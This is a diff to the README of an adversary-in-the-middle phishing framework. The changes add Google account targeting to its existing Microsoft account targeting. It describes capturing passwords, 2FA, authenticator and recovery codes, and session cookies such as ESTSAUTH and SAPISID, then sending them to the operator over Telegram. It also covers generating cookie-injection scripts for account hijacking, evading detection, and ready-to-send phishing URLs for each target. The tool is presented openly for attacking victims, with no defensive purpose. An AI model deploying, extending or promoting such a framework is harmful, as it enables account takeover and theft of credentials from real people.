@@ -1,24 +1,25 @@
 # Azure AiTM Phishing Framework 2025
 
-An advanced Adversary-in-the-Middle (AiTM) phishing framework with enhanced credential capture, real-time Telegram notifications, and seamless Microsoft account support.
+An advanced Adversary-in-the-Middle (AiTM) phishing framework with enhanced credential capture, real-time Telegram notifications, and support for Microsoft and Google accounts.
 
 ## 🚀 Features
 
 ### Core Capabilities
 - **Service Worker-Based AiTM**: Leverages browser service workers for transparent proxying
-- **Universal Microsoft Support**: Works with both corporate (Office 365) and personal (Outlook.com) accounts
+- **Multi-Platform Support**: Works with Microsoft (Office 365 & personal) and Google accounts
 - **Real-Time Telegram Notifications**: Instant alerts for captured credentials and auth cookies
 - **Smart Cookie Filtering**: Only captures and reports critical authentication cookies
-- **Full Credential Capture**: Email, password, and 2FA/OTC codes
+- **Full Credential Capture**: Email, password, 2FA/OTP codes, authenticator apps, recovery codes
 - **Cookie Export Format**: Generates ready-to-use cookie injection scripts
 - **Azure Web Apps Deployment**: Designed for PaaS deployment to avoid domain reputation issues
 
 ### Enhanced Features
-- **Short URLs**: Convenient shortcuts (`/c` for corporate, `/p` for personal)
+- **Short URLs**: Convenient shortcuts (`/c` for corporate, `/p` for personal, `/g` for Google)
 - **Session Persistence**: Maintains victim sessions across proxy restarts
 - **Encrypted Logging**: AES-256-CTR encryption for all captured data
 - **Anti-Detection**: Advanced header manipulation and client-side evasion
 - **Automatic URL Rewriting**: Keeps victims on the proxy domain throughout their session
+- **Enhanced Credential Detection**: Captures passwords from all authentication flows including recovery emails, passkeys, and authenticator apps
 
 ## 📋 Prerequisites
 
@@ -78,25 +79,34 @@ ngrok http 3000
 
 ### Short URLs
 
-**Corporate Accounts:**
+**Microsoft Corporate Accounts:**
 - `https://your-domain.azurewebsites.net/c`
 - `https://your-domain.azurewebsites.net/corp`
 - `https://your-domain.azurewebsites.net/corporate`
 
-**Personal Accounts:**
+**Microsoft Personal Accounts:**
 - `https://your-domain.azurewebsites.net/p`
 - `https://your-domain.azurewebsites.net/personal`
 
+**Google Accounts:**
+- `https://your-domain.azurewebsites.net/g`
+- `https://your-domain.azurewebsites.net/google`
+
 ### Full Phishing URLs
 
-Corporate:
+Microsoft Corporate:
 ```
 https://your-domain.azurewebsites.net/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F
 ```
 
-Personal:
+Microsoft Personal:
 ```
 https://your-domain.azurewebsites.net/login?method=signin&mode=secure&client_id=4765445b-32c6-49b0-83e6-1d93765276ca&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F
+```
+
+Google:
+```
+https://your-domain.azurewebsites.net/login?method=signin&mode=secure&client_id=717762328687-iludtf96g1hinl76e4lc1b9a82g457nn.apps.googleusercontent.com&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Faccounts.google.com%2F
 ```
 
 ## 📱 Telegram Notifications
@@ -104,41 +114,43 @@ https://your-domain.azurewebsites.net/login?method=signin&mode=secure&client_id=
 ### Captured Data Includes:
 
 1. **New Victim Sessions**
-   - Target domain
+   - Target domain (Microsoft or Google)
    - Session cookie for hijacking
    - Timestamp and log file
 
 2. **Login Credentials**
    - Email address
-   - Full password
-   - 2FA/OTC codes
+   - Full password (from all auth methods)
+   - 2FA/OTP codes
+   - Authenticator app codes
+   - Recovery codes
    - MFA methods
 
 3. **Critical Auth Cookies**
-   - ESTSAUTH
-   - ESTSAUTHPERSISTENT
-   - ESTSAUTHLIGHT
-   - SignInStateCookie
-   - MSPAuth, PPAuth (personal accounts)
+   - **Microsoft**: ESTSAUTH, ESTSAUTHPERSISTENT, ESTSAUTHLIGHT, SignInStateCookie, MSPAuth, PPAuth
+   - **Google**: SID, SSID, APISID, SAPISID, HSID, NID, OSID
 
 4. **Cookie Export Script**
    - Ready-to-inject JavaScript
    - All auth cookies in correct format
-   - Auto-redirect to Microsoft login
+   - Auto-redirect to login page
 
 ## 🔒 Security Features
 
 ### Anti-Detection Mechanisms
 - Removes proxy-identifying headers
+- Platform-specific header handling (Microsoft vs Google)
 - Spoofs legitimate browser fingerprints
 - Client-side WebRTC blocking
 - Canvas fingerprinting override
 - Timezone and hardware spoofing
 
-### Data Protection
-- AES-256-CTR encryption for logs
-- Secure session management
-- No plaintext credential storage
+### Enhanced Credential Capture
+- **Microsoft**: Captures from login, GetCredentialType, ProcessAuth, oauth endpoints
+- **Google**: Captures from ServiceLogin, Passwd, SecondFactor, challenge endpoints
+- **Universal Detection**: Monitors for password fields in all POST requests
+- **Recovery Flow Support**: Captures codes sent to recovery emails
+- **Authenticator Support**: Captures TOTP codes from authenticator apps
 
 ## 📁 Log Decryption
 
